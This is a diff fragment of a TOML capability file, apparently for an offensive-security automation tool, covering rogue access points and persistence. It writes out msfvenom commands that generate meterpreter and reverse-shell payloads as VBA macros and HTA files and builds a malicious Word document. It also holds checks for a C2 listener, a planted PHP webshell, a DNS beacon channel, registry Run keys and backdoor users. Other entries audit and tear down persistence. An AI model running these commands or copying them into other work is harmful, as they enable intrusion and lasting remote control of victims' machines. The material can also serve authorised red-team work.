+[[capability.provider.operation]]
+name = 'Station List Check'
+args = ['dev', '{iface}', 'station', 'dump']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Rogue Traffic Capture'
+args = ['-i', '{iface}', '-w', '/tmp/rogue.pcap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'dnsspoof'
+[[capability.provider.operation]]
+name = 'DNS Spoof On Rogue'
+args = ['-i', '{iface}']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ip'
+[[capability.provider.operation]]
+name = 'AP Interface Verify'
+args = ['addr', 'show']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Rogue Daemon Verify'
+args = ['aux']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'airbase-ng'
+[[capability.provider.operation]]
+name = 'Rogue AP Teardown'
+args = ['-v', '{iface}']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.macro-autorun-persistence'
+phase = 'persistence'
+label = 'MACRO AUTORUN PERSISTENCE'
+summary = 'Verify document-based autorun persistence vectors'
+inputs = [
+  { key = 'lhost', type = 'target', required = true },
+  { key = 'lport', type = 'port', required = true },
+]
+[[capability.provider]]
+binary = 'msfvenom'
+[[capability.provider.operation]]
+name = 'Macro Regenerate'
+args = ['-p', 'windows/meterpreter/reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'vba']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'msfvenom'
+[[capability.provider.operation]]
+name = 'HTA Regenerate'
+args = ['-p', 'windows/x64/shell_reverse_tcp', 'LHOST={lhost}', 'LPORT={lport}', '-f', 'hta-psh']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Doc Artifact Verify'
+args = ['macro.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'exiftool'
+[[capability.provider.operation]]
+name = 'Doc Metadata Verify'
+args = ['macro.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'oledump.py'
+[[capability.provider.operation]]
+name = 'Macro Stream Dump'
+args = ['-s', '4', 'macro.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'oledump.py'
+[[capability.provider.operation]]
+name = 'Macro Stream Analyze'
+args = ['-a', 'macro.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'olevba'
+[[capability.provider.operation]]
+name = 'VBA Analyze'
+args = ['macro.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Doc Builder Rebuild'
+args = ['build_macro.py', '--lhost', '{lhost}', '--lport', '{lport}', '--out', 'macro_persist.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Doc Hash Snapshot'
+args = ['macro_persist.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'strings'
+[[capability.provider.operation]]
+name = 'Doc String Check'
+args = ['-n', '8', 'macro_persist.doc']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'C2 Reachability Check'
+args = ['-sk', 'http://{lhost}:{lport}/']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Docs Share Placement Check'
+args = ['smb', '{lhost}', '--shares']
+output = 'lines'
+network = true
+
+[[capability]]
+id = 'persistence.persistence-audit'
+phase = 'persistence'
+label = 'PERSISTENCE AUDIT'
+summary = 'Enumerate all persistence locations for coverage verification'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'Cron Audit'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Enabled Units Audit'
+args = ['list-unit-files', '--state=enabled', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Cron Dirs Audit'
+args = ['-la', '/etc/cron.d/', '/etc/cron.daily/', '/var/spool/cron/crontabs/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Rc Local Audit'
+args = ['-c', 'exec|start', '/etc/rc.local']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Profile Dir Audit'
+args = ['-la', '/etc/profile.d/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Shell Hook Audit'
+args = ['-rE', 'source|exec', '/etc/bash.bashrc', '/etc/profile']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Authorized Keys Audit'
+args = ['/root/.ssh/authorized_keys']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Audit'
+args = ['list-timers', '--all', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Artifact Reference Audit'
+args = ['-r', '{name}', '/etc/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'getent'
+[[capability.provider.operation]]
+name = 'User Account Audit'
+args = ['passwd']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Init Dir Audit'
+args = ['-la', '/etc/init.d/']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Running Persistence Verify'
+args = ['aux']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.persistence-teardown'
+phase = 'persistence'
+label = 'PERSISTENCE TEARDOWN'
+summary = 'Cleanly remove planted persistence artifacts'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+]
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'Cron Remove'
+args = ['-r']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Stop Disable'
+args = ['disable', '--now', '{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'rm'
+[[capability.provider.operation]]
+name = 'Unit File Remove'
+args = ['-f', '/etc/systemd/system/{name}.service', '/etc/systemd/system/{name}.timer']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Daemon Reload Final'
+args = ['daemon-reload']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'rm'
+[[capability.provider.operation]]
+name = 'Profile Drop Remove'
+args = ['-f', '/etc/profile.d/{name}.sh', '/etc/cron.d/{name}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'update-rc.d'
+[[capability.provider.operation]]
+name = 'Init Entry Remove'
+args = ['-f', '{name}', 'remove']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'Cron Teardown Verify'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Artifact Absence Verify'
+args = ['-r', '{name}', '/etc/', '2>/dev/null']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ls'
+[[capability.provider.operation]]
+name = 'Unit Dir Absence Verify'
+args = ['/etc/systemd/system/{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'userdel'
+[[capability.provider.operation]]
+name = 'Backdoor User Remove'
+args = ['-r', '{name}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ss'
+[[capability.provider.operation]]
+name = 'Listener Absence Verify'
+args = ['-tlnp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ps'
+[[capability.provider.operation]]
+name = 'Process Absence Verify'
+args = ['aux']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'persistence.persistence-verification'
+phase = 'persistence'
+label = 'PERSISTENCE VERIFICATION'
+summary = 'Actively verify each persistence mechanism still fires'
+inputs = [
+  { key = 'name', type = 'text', required = false, default = 'tsupd' },
+  { key = 'rhost', type = 'target', required = true },
+  { key = 'username', type = 'username', required = true },
+  { key = 'password', type = 'password', required = true },
+]
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Service Liveness Check'
+args = ['is-active', '{name}.service']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'systemctl'
+[[capability.provider.operation]]
+name = 'Timer Liveness Check'
+args = ['is-active', '{name}.timer']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'crontab'
+[[capability.provider.operation]]
+name = 'Cron Liveness Check'
+args = ['-l']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'journalctl'
+[[capability.provider.operation]]
+name = 'Service Fire Log Check'
+args = ['-u', '{name}.service', '--since', 'today', '--no-pager']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ssh'
+[[capability.provider.operation]]
+name = 'SSH Key Liveness Check'
+args = ['-o', 'BatchMode=yes', '-o', 'StrictHostKeyChecking=no', '{username}@{rhost}', 'id']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Run Key Liveness Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'reg', '-o', 'ACTION=read,KEY=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run,VALUE=TSecUpdate']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'nxc'
+[[capability.provider.operation]]
+name = 'Task Liveness Check'
+args = ['smb', '{rhost}', '-u', '{username}', '-p', '{password}', '-M', 'schtask', '-o', 'ACTION=list']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'curl'
+[[capability.provider.operation]]
+name = 'Webshell Liveness Check'
+args = ['-sk', '{rhost}/uploads/shell.php?cmd=whoami']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'dig'
+[[capability.provider.operation]]
+name = 'DNS Channel Liveness'
+args = ['@{rhost}', 'beacon.t.{name}', 'TXT']
+output = 'lines'
+network = true
+[[capability.provider]]
+binary = 'ss'
+[[capability.provider.operation]]
+name = 'Listener Liveness Check'
+args = ['-tlnp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'id'
+[[capability.provider.operation]]
+name = 'Backdoor User Liveness'
+args = ['{name}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Verification Report Build'
+args = ['persistence_verify.py', '--name', '{name}', '--out', '/tmp/persist_report.json']
+output = 'json'
+network = false
 
 # --------------------------------------------------------------------------
 # OBJECTIVES
